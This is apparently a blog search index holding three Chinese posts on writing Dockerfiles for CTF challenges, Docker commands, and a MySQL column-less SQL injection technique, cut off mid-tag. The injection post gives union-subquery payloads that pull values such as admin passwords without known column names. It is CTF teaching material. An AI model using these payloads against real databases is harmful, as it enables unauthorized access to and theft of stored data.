<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>dockerfile编写学习</title>
      <link href="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​        镜像的定制实际上就是定制每一层所添加的配置文件，如果我们可以把每一层的修改、安装、构建、操作的命令都写入一个脚本，然后用这个脚本来构建、定制镜像，那么镜像构建透明性的问题、体积的问题就会得到解决，这个脚本就是 Dockerfile; Dockerfile  是一个文本文件，其内包含了一条条的指令，每一条指令构建一层，每一层指令的内容，就是描述该层应该如何构建，然后通过 commit 构成新的镜像。</p><h3 id="0x-02-Dockerfile-常用参数"><a href="#0x-02-Dockerfile-常用参数" class="headerlink" title="0x 02 Dockerfile 常用参数"></a>0x 02 Dockerfile 常用参数</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>FROM：指定基础镜像，必须是第一条指令,格式为<code>FROM image</code>或<code>FROM image:tag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 定制 nginx 镜像的 Dockerfile</span><br><span class="line"></span><br><span class="line">FROM nginx</span><br><span class="line">RUN echo &#39;&lt;h1&gt;Hello,Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</span><br></pre></td></tr></table></figure><p>注： Docker Hub 上有很多高质量的服务类的官方镜像可以拿来直接使用，比如：nginx 、redis 、mysql 、php 、mongo \ tomcat 等，可以在其中找最符合的一个进行定制</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>RUN ：用来执行命令行命令，格式有两种：</p><ol><li><p>shell 格式： <code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样</p></li><li><p>exec 格式：<code>RUN [&quot;可执行文件&quot;，“参数1”，“参数2”]</code>，更像是函数调用中的格式</p></li></ol><p>warning:每一个RUN命令都会在 docker镜像中新建一层，所以应该尽量少用 RUN 命令，而且要在RUN 的最后要做必要的清除工作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 一层构建，并在最后清理压缩包等缓存文件</span><br><span class="line">FROM debian:stretch</span><br><span class="line"></span><br><span class="line">RUN buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \</span><br><span class="line">&amp;&amp; apt-get update \</span><br><span class="line">&amp;&amp; apt-get install -y $buildDeps \</span><br><span class="line">&amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \</span><br><span class="line">&amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \</span><br><span class="line">&amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \</span><br><span class="line">&amp;&amp; rm redis.tar.gz \</span><br><span class="line">&amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; apt-get purge -y --auto-remove $buildDeps</span><br></pre></td></tr></table></figure><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p> COPY : 用来从构建上下文目录中&lt;原路径&gt;的文件/目录复制到新一层镜像内的 &lt;目标路径&gt;位置，格式有两种：</p><p>  1，shell 格式：<code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;原路径&gt;...&lt;目标路径&gt;</code></p><p>  2，exec 合适：<code>COPY[--chown=&lt;user&gt;:&lt;group&gt;] [&quot;原路径1&quot;，... &quot;&lt;目标路径&gt;&quot;]</code></p><p>原路径：可以是多个，甚至可以是通配符</p><p>目标路径：可以是容器内的绝对路径，也可以是相对于工作目录的相对路径(工作目录可以用 WORKDIR 指令来指定，不需要事先创建，会自动创建)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 利用 通配符 进行复制</span><br><span class="line">COPY hom* &#x2F;mydir&#x2F;</span><br><span class="line">COPY hom?.txt &#x2F;mydir&#x2F;</span><br></pre></td></tr></table></figure><p>note : COPY 会将原文件的各种数据都保留，比如 读、写、执行权限，可以通过 –chown=<user>:<group> 选项来改变文件的所属用户及所属组。</group></user></p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;], 推荐使用该方式</span><br><span class="line"></span><br><span class="line">CMD [&quot;param1&quot;, &quot;param2&quot;]，为ENTRYPOINT指令提供预设参数</span><br><span class="line"></span><br><span class="line">CMD command param1 param2 在SHELL中执行</span><br></pre></td></tr></table></figure><p>CMD指令的主要目的是为执行容器提供默认值，每个Dockerfile只有一个CMD命令，如果指定了多个CMD命令，也只会有一条执行，如果启动容器的时候指定了运行的命令，则会覆盖掉CMD指定的命令。</p><h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>语法：<code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></p><p>　　该条指令是声明运行时容器提供的服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。这样声明带来两个好处：</p><p>　　1，帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射</p><p>　　2，在运行时使用随机端口映射，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口</p><p>note: 要将 EXPOSE 和在运行时使用 -p  &lt;宿主端口&gt;:&lt;容器端口&gt; 区分开来。-p 是映射宿主端口和容器端口，就是将容器的对应端口服务公开给外界访问，而  EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会在宿主进行端口映射。</p><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>格式为：<code>WORKDIR /path/to/workdir</code></p><p>切换⽬录指令，类似于cd命令，对RUN、CMD、ENTRYPOINT⽣效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>使用<a href="https://docs.docker.com/engine/reference/builder/#label" target="_blank" rel="noopener">LABEL</a>指令，可以为镜像设置元数据，例如<strong>镜像创建者</strong>或者<strong>镜像说明</strong>。旧版的 Dockerfile 语法使用<a href="https://docs.docker.com/engine/reference/builder/#maintainer-deprecated" target="_blank" rel="noopener">MAINTAINER</a>指令指定镜像创建者，但是它已经被弃用了。有时，一些外部程序需要用到镜像的元数据，例如<a href="https://github.com/NVIDIA/nvidia-docker" target="_blank" rel="noopener">nvidia-docker</a>需要用到<code>com.nvidia.volumes.needed</code>。示例如下:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">7</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer <span class="string">"jakub.skalecki@example.com"</span></span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Author=<span class="string">"hwlanxiaojun"</span> Blog=<span class="string">"https://hwlanxiaojun.github.io"</span></span></span><br></pre></td></tr></table></figure><h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>ENV : 用来设置环境变量，格式有两种：</p><p>　　1，ENV <key> <value></value></key></p><p>　　2，ENV <key1>=<value1> <key2>=<value2>…</value2></key2></value1></key1></p><p>在设置了环境变量之后，无论是后面的其它指令，如 RUN ，还是运行时的应用，都可以直接使用这里定义的环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义环境变量</span><br><span class="line">ENV VERSION&#x3D;1.0 DEBUG&#x3D;ON \</span><br><span class="line">    NAME&#x3D;&quot;Happy Feet&quot;</span><br><span class="line"></span><br><span class="line"># 官方 node 镜像 Dockerfile 中：</span><br><span class="line">ENV NODE_VERSION 7.2.0</span><br></pre></td></tr></table></figure><h3 id="0x-03-构建镜像"><a href="#0x-03-构建镜像" class="headerlink" title="0x 03 构建镜像"></a>0x 03 构建镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t webprac .</span><br><span class="line">&#x2F;&#x2F;其中.表示当前路径，构建的时候要保证jar包和Dockerfile文件在同一个文件夹下，-t: 镜像的名字及标签，webprac是标签名</span><br><span class="line">ocker run -dit -p 8080:80 webprac</span><br></pre></td></tr></table></figure><h4 id="0x-04-动态flag编写"><a href="#0x-04-动态flag编写" class="headerlink" title="0x 04 动态flag编写"></a>0x 04 动态flag编写</h4><p>动态flag的存在形式一般有以下三种：文件中、执行readflag、数据库中</p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>linux下，<code>sed</code>命令可以将file中每行的字符串进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;原字符串&#x2F;新字符串&#x2F;&#39; file</span><br></pre></td></tr></table></figure><p><code>export</code>命令可以查看、设置环境变量</p><p>那么在<code>docker-php-entrypoint</code>文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;flag_here&#x2F;$FLAG&#x2F;&quot; flag.php</span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>就会根据当前环境变量的<code>FLAG</code>值来替换掉<code>flag.php</code>中的<code>flag_here</code>，因此还需要在<code>flag.php</code>中设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; flag_here</span><br></pre></td></tr></table></figure><p>这样，在Dockerfile目录执行<code>docker build -t test .</code>将Dockerfile文件打包为镜像<code>test</code>，使用安装了动态靶机插件的CTFd平台部署后，该插件在启动靶机时会自动生成flag并应用到环境变量中，这样便实现了生成动态flag。</p><h4 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h4><p>先来看下写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">echo $FLAG &gt; &#x2F;flag</span><br><span class="line">chmod u+s &#x2F;readflag</span><br><span class="line">chmod 400 &#x2F;flag</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>首先将环境变量<code>$FLAG</code>写入到<code>/flag</code>中，之后进行权限配置：</p><p>1.chmod u+s /readflag ： 为<code>/readflag</code>文件加上setuid标志，设置使文件在执行阶段具有文件所有者的权限</p><p>2.chmod 400 /flag ：将<code>flag</code>文件权限设为文件拥有者只读，群组和其他用户没有任何权限</p><p>那么执行<code>./readflag</code>时，就会拥有文件所有者的权限，可以读取<code>/flag</code>了</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>flag.sh：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 修改数据库中的 FLAG</span><br><span class="line">mysql -e &quot;CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli; CREATE TABLE IF NOT EXISTS \&#96;1919810931114514\&#96; (\&#96;flag\&#96; varchar(100) NOT NULL) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8;INSERT INTO \&#96;1919810931114514\&#96; VALUES (&#39;$FLAG&#39;);&quot; -uroot -proot</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br><span class="line"></span><br><span class="line">rm -f &#x2F;flag.sh</span><br></pre></td></tr></table></figure><h3 id="0x-05-打包镜像到Docker-Hub"><a href="#0x-05-打包镜像到Docker-Hub" class="headerlink" title="0x 05 打包镜像到Docker Hub"></a>0x 05 打包镜像到Docker Hub</h3><p>为了方便搜索和下载自己编写的镜像，可以通过以下步骤来实现：</p><p>1.到<code>https://hub.docker.com/</code>注册一个账号</p><p>2.登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login -u 用户名 -p 密码</span><br></pre></td></tr></table></figure><p>3.更改镜像标签，格式为<code>用户名/标签名</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag test 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>4.推送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>5.登出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure><p>这时就可以在Docker Hub上找到刚上传的镜像了，将其添加描述后就能使用<code>docker search</code>搜索到自己的镜像</p><h3 id="0x-06-ctfd平台部署"><a href="#0x-06-ctfd平台部署" class="headerlink" title="0x 06 ctfd平台部署"></a>0x 06 ctfd平台部署</h3><p>参考这几篇文章：</p><p><a href="https://www.zhaoj.in/read-6333.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html</a></p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756" target="_blank" rel="noopener">https://blog.csdn.net/fjh1997/article/details/100850756</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p><h3 id="0x-07-docker-compose"><a href="#0x-07-docker-compose" class="headerlink" title="0x 07 docker-compose"></a>0x 07 docker-compose</h3><p>docker-compose.yml：告诉docker-compose该怎么编排一组服务</p><p><img src="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/image-20200322224722173.png" alt></p><p>参考链接：</p><blockquote><p><a href="https://www.cnblogs.com/zpcoding/p/11450686.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpcoding/p/11450686.html</a></p><p><a href="https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html" target="_blank" rel="noopener">https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html</a></p><p><a href="http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dockerfile编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习笔记</title>
      <link href="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h3><ul><li>Docker是一个新的容器化的技术，容器有效的将单个操作系统管理的资源划分到孤立的组中，以便更好的在孤立的组之间平衡有冲突的资源使用需求。</li><li>Docker 容器本质上是宿主机上的一个进程。Docker 通过 namespace 实现了资源隔离，通过 cgroups 实现了资源的限制，通过写时复制机制（copy-on-write）实现了高效的文件操作。 </li><li>Docker有五个命名空间：进程、网络、挂载、宿主和共享内存，为了隔离有问题的应用，Docker运用Namespace将进程隔离，为进程或进程组创建已隔离的运行空间，为进程提供不同的命名空间视图。这样，每一个隔离出来的进程组，对外就表现为一个container(容器)。</li></ul><h3 id="镜像和容器"><a href="#镜像和容器" class="headerlink" title="镜像和容器"></a>镜像和容器</h3><ul><li><p>Image: 镜像是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p></li><li><p>Container:容器是镜像的运行时实例 - 实际执行时镜像会在内存中变成什么。默认情况下，它完全独立于主机环境运行，仅在配置为访问主机文件和端口的情况下才执行此操作。</p></li><li><p><code>容器 = 镜像 + 读写层</code></p><p>容器可以获取本机访问，每个容器都在独立进程中运行，占用的内存不超过任何其他可执行文件。</p></li></ul><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322154938724.png" alt="image-20200322154938724"></p><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322155027373.png" alt="image-20200322155027373"></p><h3 id="Docker的使用"><a href="#Docker的使用" class="headerlink" title="Docker的使用"></a>Docker的使用</h3><h4 id="启动和放入启动项"><a href="#启动和放入启动项" class="headerlink" title="启动和放入启动项"></a>启动和放入启动项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#centos7.0版本</span><br><span class="line">systemctl start docker </span><br><span class="line">systemctl enable docker</span><br><span class="line"></span><br><span class="line">#兼容老版本</span><br><span class="line">service docker start</span><br><span class="line">chkconfig docker on</span><br></pre></td></tr></table></figure><h4 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">docker search [镜像]      #搜索镜像</span><br><span class="line">docker pull [镜像]        #下载镜像</span><br><span class="line">docker run -p 4000:80 username&#x2F;repository:tag #从远程镜像仓库中拉取并运行镜像</span><br><span class="line"></span><br><span class="line">sudo docker pull ubuntu:12.04 等同于</span><br><span class="line">docker pull registry.hub.docker.com&#x2F;ubuntu:12.04 </span><br><span class="line"></span><br><span class="line">docker push [镜像]            #发布镜像</span><br><span class="line">docker rmi [镜像]             #删除镜像</span><br><span class="line">docker images                 #查看本地镜像(列目录)</span><br><span class="line">docker images    -q           #只显示镜像ID</span><br><span class="line">docker history [镜像]         #历史镜像</span><br><span class="line">docker tag [镜像] username&#x2F;repository:tag #标记镜像</span><br><span class="line"></span><br><span class="line">docker rmi $(docker images -q)      #删除所有停止的镜像</span><br><span class="line">docker rmi -f $(docker images -q)   #强制删除所有的镜像</span><br></pre></td></tr></table></figure><h4 id="容器相关操作"><a href="#容器相关操作" class="headerlink" title="容器相关操作"></a>容器相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#创建容器</span><br><span class="line">docker run [镜像] &#x2F;bin&#x2F;echo hello world       #输出hello world</span><br><span class="line">docker run -i -t [镜像] &#x2F;bin&#x2F;bash             #交互式进入容器 #-i: 以交互模式运行容器  -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">docker run [镜像]  apt-get install -y app_name    #在容器安装新的程序</span><br><span class="line"></span><br><span class="line">docker exec -it kali &#x2F;bin&#x2F;bash          #进入容器</span><br><span class="line">docker run -it -d kali                  #启动容器，后台运行 #-d: 后台运行容器，并返回容器ID；</span><br><span class="line">docker run -it -p 53:53 kali            #启动容器的时候可以映射端口 #-p: 端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">#进入交互式界面</span><br><span class="line">进入容器：</span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker exec -it [容器ID] &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">#查看容器</span><br><span class="line">docker ps                   #列出当前运行的容器</span><br><span class="line">docker ps -a                #列出所有的容器</span><br><span class="line">docker ps -l                #列出最近一次启动的容器</span><br><span class="line">docker ps -a -q             #查看所有的容器ID</span><br><span class="line"></span><br><span class="line">#容器操作</span><br><span class="line">docker inspect [容器名字]&#x2F;ID        #显示容器信息</span><br><span class="line">docker start [容器名字]&#x2F;ID      #启动容器</span><br><span class="line">docker stop [容器名字]&#x2F;ID       #停止容器</span><br><span class="line">docker kill [容器名字]&#x2F;ID       #杀死容器</span><br><span class="line">docker restart [容器名字]&#x2F;ID        #重新启动容器</span><br><span class="line">docker attach [容器名字]&#x2F;ID     #进入容器</span><br><span class="line">docker logs [容器名字]&#x2F;ID       #查看容器日志</span><br><span class="line">docker diff [容器名字]&#x2F;ID       #查看容器修改操作</span><br><span class="line">docker top [容器名字]&#x2F;ID            #显示容器进程信息</span><br><span class="line">docker cp ID:&#x2F;path to_path      #从容器中拷贝数据到本地</span><br><span class="line">docker cp [容器名字]:&#x2F;path to_path  #从容器中拷贝数据到本地</span><br><span class="line"></span><br><span class="line">#删除容器</span><br><span class="line">docker rm [容器]&#x2F;ID       #删除容器</span><br><span class="line">docker rm $(docker ps -a -q)    #删除所有停止的容器</span><br><span class="line">docker rm -f $(docker ps -a -q) #强制删除所有的容器</span><br></pre></td></tr></table></figure><p>参考链接：</p><blockquote><p><a href="https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL无列名注入</title>
      <link href="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-简介"><a href="#0x-01-简介" class="headerlink" title="0x 01 简介"></a>0x 01 简介</h3><p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p><p>在 mysql =&gt; 5 的版本中存在一个名为  information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli  中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p><p>当我们通过暴力破解获取到表名后，如何利用呢？</p><p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p><h3 id="0x-02-使用条件-amp-方法"><a href="#0x-02-使用条件-amp-方法" class="headerlink" title="0x 02 使用条件&amp;方法"></a>0x 02 使用条件&amp;方法</h3><p> <strong>使用条件&amp;方法</strong></p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p><p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><p> <strong>不使用表名查询</strong></p><p>正常的 sql 查询如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;admin&#96;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120103425.png" alt></p><p>其中，列名为 id、name、password，使用 union 查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120025502.png" alt></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;3&#96; from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure><p>末尾的 a 可以是任意字符，用于命名。</p><p>当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>同时查询多个列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#96;2&#96;,0x2d,&#96;3&#96;) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322230016384.png" alt></p><p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p><p>payload：<code>select a,b from posts where a=-1 union select 1,(select concat(</code>3<code>,0x2d,</code>4<code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</code></p><h3 id="0x-03-例题分析"><a href="#0x-03-例题分析" class="headerlink" title="0x 03 例题分析"></a>0x 03 例题分析</h3><h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" 